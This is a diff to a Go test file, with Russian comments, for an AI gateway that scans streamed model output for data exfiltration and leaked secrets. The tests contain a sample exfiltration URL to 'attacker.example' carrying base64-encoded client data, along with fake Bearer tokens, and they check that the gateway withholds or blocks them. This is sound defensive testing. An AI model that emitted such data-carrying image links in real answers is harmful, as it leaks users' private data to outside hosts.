@@ -20,6 +20,7 @@ import (
 	"github.com/azuresong-afk/ai_railway/internal/detect"
 	"github.com/azuresong-afk/ai_railway/internal/detect/builtin"
 	"github.com/azuresong-afk/ai_railway/internal/detect/canary"
+	"github.com/azuresong-afk/ai_railway/internal/detect/exfil"
 	"github.com/azuresong-afk/ai_railway/internal/events"
 	"github.com/azuresong-afk/ai_railway/internal/ids"
 	"github.com/azuresong-afk/ai_railway/internal/policy"
@@ -758,7 +759,7 @@ func TestIncrementalForcedReleaseCuts(t *testing.T) {
 
 // Окно проверки начинается с начала слова и не позже переданного текста.
 func TestStreamTextWindowStart(t *testing.T) {
-	w := newStreamText(nil)
+	w := newStreamText(nil, nil)
 	w.acc.WriteString(strings.Repeat("слово ", 2000))
 	w.released = w.acc.Len() - 10
 	ws := w.start()
@@ -823,7 +824,10 @@ func TestIncrementalKeepsEarlierFindings(t *testing.T) {
 // Текст без пробелов не увеличивает работу детекторов сверх постоянного
 // множителя от длины ответа (окно ограничено streamMaxHold).
 func TestIncrementalWorkBounded(t *testing.T) {
-	for _, text := range []string{strings.Repeat("x", 256<<10), strings.Repeat("слово ", 256<<10/12)} {
+	// Абзацы чуть короче exfil.MaxWindowBack — худший случай для окон,
+	// которые начинаются с начала абзаца.
+	para := strings.Repeat(strings.Repeat("слово ", (exfil.MaxWindowBack-600)/12)+"\n\n", 16)
+	for _, text := range []string{strings.Repeat("x", 256<<10), strings.Repeat("слово ", 256<<10/12), para} {
 		scanned := 0
 		counting := outputDetector{fakeDetector{id: "test.secret", run: func(ctx context.Context, tx detect.Text) ([]detect.Finding, error) {
 			scanned += len(tx.Text)
@@ -835,8 +839,187 @@ func TestIncrementalWorkBounded(t *testing.T) {
 		if cut || got != text {
 			t.Fatalf("обрыв %v или текст изменён", cut)
 		}
-		if scanned > 20*len(text) {
+		if scanned > 30*len(text) {
 			t.Fatalf("детекторы прочитали %d байт на ответ %d байт", scanned, len(text))
 		}
+	}
+}
+
+// contextWord — тестовый детектор, которому нужен контекст: SECRET —
+// находка, только если текст начинается с «BEGIN» (как изображение после
+// блока кода, начало которого не попало в окно).
+var contextWord = outputDetector{fakeDetector{id: "test.secret", run: func(ctx context.Context, t detect.Text) ([]detect.Finding, error) {
+	if !strings.HasPrefix(t.Text, "BEGIN") {
+		return nil, nil
+	}
+	return secretWord.run(ctx, t)
+}}}
+
+// Находка, которую видит только проверка с большим контекстом (итоговая
+// по всему ответу), целиком в уже переданном тексте: применить её поздно,
+// поток обрывается без [DONE], в событии — stream_late (ревью 1.22–1.24,
+// п. 1).
+//
+// Покрывает: DM-10
+func TestIncrementalLateFindingCuts(t *testing.T) {
+	for _, act := range []policy.Action{policy.Block, policy.Redact} {
+		t.Run(string(act), func(t *testing.T) {
+			ph := newProcHarness(t, act, nil)
+			withOutputRule(t, contextWord, act)(ph.sp.app)
+			text := "BEGIN " + filler(exfil.MaxWindowBack+streamOverlap+4000) + "SECRET " + filler(3000)
+			got, cut := ph.run(t, splitEvery(text, 50))
+			if !cut || ph.sp.rec.respCutRule != ruleStreamLate || strings.Contains(strings.Join(ph.sent, ""), chat.Done) {
+				t.Fatalf("обрыв %v, правило %q", cut, ph.sp.rec.respCutRule)
+			}
+			if !strings.HasPrefix(text, got) {
+				t.Fatal("отданный текст искажён")
+			}
+		})
+	}
+}
+
+// Повторная причина завершения: вызов инструмента не уходит дважды, весь
+// ответ не проверяется заново, поток завершается штатно (ревью 1.22–1.24,
+// п. 2).
+//
+// Покрывает: DM-13
+func TestDM13_StreamRepeatedFinishReason(t *testing.T) {
+	for name, mod := range map[string]func(*gwOpts){"monitor": nil, "incremental": func(o *gwOpts) { o.app = enforce }} {
+		t.Run(name, func(t *testing.T) {
+			parts := []string{
+				sseData(t, map[string]any{"role": "assistant", "content": nil, "tool_calls": []map[string]any{
+					{"index": 0, "id": "call_1", "type": "function", "function": map[string]any{"name": "f", "arguments": `{"n":1}`}}}}, ""),
+				sseData(t, map[string]any{}, "tool_calls"),
+				sseData(t, map[string]any{}, "stop"),
+				"data: [DONE]\n\n",
+			}
+			gw, _ := streamGateway(t, parts, mod)
+			res := readStream(t, postStream(t, gw, "x"))
+			if len(res.tools) != 1 || !res.done || res.errCode != "" || strings.Count(res.raw, `"finish_reason":"`) != 1 {
+				t.Fatalf("поток: %q", res.raw)
+			}
+		})
+	}
+}
+
+// Обратная подстановка в потоке, после которой output.exfil находит новую
+// ссылку с данными, отменяется — как в ответе без потока (monitor и
+// incremental).
+//
+// Покрывает: DM-11, DM-31
+func TestDM11_StreamRestoreWithheldWhenExfilGrows(t *testing.T) {
+	value := "https://attacker.example/x.png?d=SW1wb3J0YW50OiBjbGllbnQgSU5OIDc3MDcwODM4OTM"
+	for _, incremental := range []bool{false, true} {
+		t.Run(fmt.Sprint("incremental=", incremental), func(t *testing.T) {
+			v := pseudonym.NewVault(pseudonym.Limits{})
+			if _, err := v.Protect(value, []pseudonym.Span{{Start: 0, End: len(value), Category: "pii.email", Action: policy.Pseudonymize}}); err != nil {
+				t.Fatal(err)
+			}
+			ph := newProcHarness(t, policy.Redact, v)
+			ph.sp.incremental = incremental
+			text := filler(700) + "Ссылка: " + emailAlias + " " + filler(700)
+			got, cut := ph.run(t, splitEvery(text, 7))
+			if cut || strings.Contains(got, "attacker.example") || got != text {
+				t.Fatalf("обрыв %v: %q", cut, got)
+			}
+			if ph.sp.rec.withheld != 1 {
+				t.Fatalf("отменено подстановок: %d", ph.sp.rec.withheld)
+			}
+		})
+	}
+}
+
+// incremental: изображение после блока кода длиннее окна проверки не уходит
+// клиенту ни при redact («Базовая защита»), ни при block («ПДн — строго»):
+// окно знает, что блок кода уже закрыт (ревью 1.22–1.24, п. 1).
+//
+// Покрывает: DM-11
+func TestDM11_IncrementalImageAfterLongCode(t *testing.T) {
+	code := "Код:\n```\n" + strings.Repeat("x := 1\n", 900) + "```\n\nСмотрите "
+	text := code + exfilImage + " " + filler(3000)
+	for name, c := range map[string]struct {
+		policy string
+		cut    bool
+	}{"redact": {policy.TemplateBase, false}, "block": {policy.TemplatePIIStrict, true}} {
+		t.Run(name, func(t *testing.T) {
+			gw, log := streamGateway(t, textStream(t, splitEvery(text, 40)...), func(o *gwOpts) {
+				o.app = func(a *config.Application) { a.PolicyMode, a.Policy = "enforce", c.policy }
+			})
+			res := readStream(t, postStream(t, gw, "x"))
+			if strings.Contains(res.raw, "attacker.example") {
+				t.Fatal("изображение ушло клиенту")
+			}
+			if res.done == c.cut || !strings.HasPrefix(res.content, code[:1000]) {
+				t.Fatalf("поток: done=%v, %q", res.done, res.errCode)
+			}
+			if e := lastStreamEvent(t, log); e.Response == nil || e.Response.Cut != c.cut || !slices.Contains(e.Threats, "DM-11") {
+				t.Fatalf("событие: %+v", e.Response)
+			}
+		})
+	}
+}
+
+// Строгое окно (длинный абзац) меняет разбор только для output.exfil:
+// секрет со знаками «~» и «`» прочие детекторы видят целиком, и маска
+// закрывает его весь (ревью исправлений 1.22–1.24, п. 1).
+//
+// Покрывает: DM-10
+func TestDM10_IncrementalStrictWindowKeepsSecret(t *testing.T) {
+	long := strings.Repeat("слово ", (exfil.MaxWindowBack+streamOverlap+2000)/12)
+	for name, token := range map[string]string{
+		"тильда":   "Bearer abcdEFGH1234ijkl~mnopQRST5678uvwx",
+		"кавычки":  "`Bearer abcdEFGH1234ijklmnopQRST5678uvwx`",
+		"короткий": "Bearer abcdEFGH1234ijklmnopQRST5678uvwx",
+	} {
+		t.Run(name, func(t *testing.T) {
+			text := long + token + " " + filler(1500)
+			gw, _ := streamGateway(t, textStream(t, splitEvery(text, 40)...), func(o *gwOpts) { o.app = enforce })
+			res := readStream(t, postStream(t, gw, "x"))
+			if strings.Contains(res.raw, "abcdEFGH") || strings.Contains(res.raw, "QRST5678") {
+				t.Fatalf("часть секрета ушла клиенту: done=%v %q", res.done, res.errCode)
+			}
+		})
+	}
+}
+
+// Находка в переданном тексте применена, только если отданные маски
+// закрывают её целиком (ревью исправлений 1.22–1.24, п. 2).
+func TestStreamTextMaskedAll(t *testing.T) {
+	w := newStreamText(nil, nil)
+	w.done = []protectSpan{{start: 10, end: 20}, {start: 20, end: 30}, {start: 40, end: 50}}
+	for _, c := range []struct {
+		s, e int
+		want bool
+	}{{10, 30, true}, {12, 18, true}, {5, 15, false}, {25, 45, false}, {40, 50, true}, {60, 70, false}} {
+		if got := w.maskedAll(c.s, c.e); got != c.want {
+			t.Errorf("[%d, %d): %v", c.s, c.e, got)
+		}
+	}
+}
+
+// Длинный нумерованный список с изображениями в блоках кода — обычный
+// ответ: поток не обрывается и изображения не маскируются (ревью
+// исправлений 1.22–1.24, п. 3).
+//
+// Покрывает: DM-11
+func TestDM11_IncrementalLongListWithCode(t *testing.T) {
+	var b strings.Builder
+	for i := range 120 {
+		fmt.Fprintf(&b, "%d. Шаг %d: вставьте разметку\n   ```html\n   <img src=\"https://cdn.example/a.png\">\n   ```\n   %s\n", i+1, i+1, strings.Repeat("пояснение ", 30))
+	}
+	text := b.String()
+	for _, pol := range []string{policy.TemplateBase, policy.TemplatePIIStrict} {
+		t.Run(pol, func(t *testing.T) {
+			gw, log := streamGateway(t, textStream(t, splitEvery(text, 40)...), func(o *gwOpts) {
+				o.app = func(a *config.Application) { a.PolicyMode, a.Policy = "enforce", pol }
+			})
+			res := readStream(t, postStream(t, gw, "x"))
+			if !res.done || res.content != text {
+				t.Fatalf("поток: done=%v %q, отдано %d из %d байт", res.done, res.errCode, len(res.content), len(text))
+			}
+			if e := lastStreamEvent(t, log); e.Response == nil || e.Response.Cut {
+				t.Fatalf("событие: %+v", e.Response)
+			}
+		})
 	}
 }
